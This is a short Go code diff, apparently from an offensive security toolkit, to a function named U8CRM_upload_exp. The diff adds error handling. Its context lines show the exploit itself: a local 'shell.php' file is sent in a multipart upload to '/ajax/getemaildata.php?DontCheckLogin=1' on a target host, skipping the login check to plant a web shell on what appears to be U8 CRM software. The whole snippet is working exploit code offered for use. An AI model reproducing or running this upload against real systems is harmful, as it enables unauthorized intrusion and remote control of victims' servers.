@@ -25,17 +25,20 @@ func U8CRM_upload_exp(target string) {
 	file, err := writer.CreateFormFile("file", filePath)
 	if err != nil {
 		config.ErrMsg.Println(err)
+		return
 	}
 
 	//打开文件并复制到表单缓冲区
 	open, err := os.Open("shell.php")
 	if err != nil {
 		config.ErrMsg.Println(err)
+		return
 	}
 	defer open.Close()
 	_, err = io.Copy(file, open)
 	if err != nil {
 		config.ErrMsg.Println(err)
+		return
 	}
 	// 添加空文件
 	writer.CreateFormFile("file1", "")
@@ -43,11 +46,13 @@ func U8CRM_upload_exp(target string) {
 	err = writer.Close()
 	if err != nil {
 		config.ErrMsg.Println(err)
+		return
 	}
 
 	//创建POST请求
 	req, err := http.NewRequest("POST", target+"/ajax/getemaildata.php?DontCheckLogin=1", body)
 	if err != nil {
+		config.ErrMsg.Println(err)
 		return
 	}
 	req.Header.Set("Content-Type", writer.FormDataContentType())
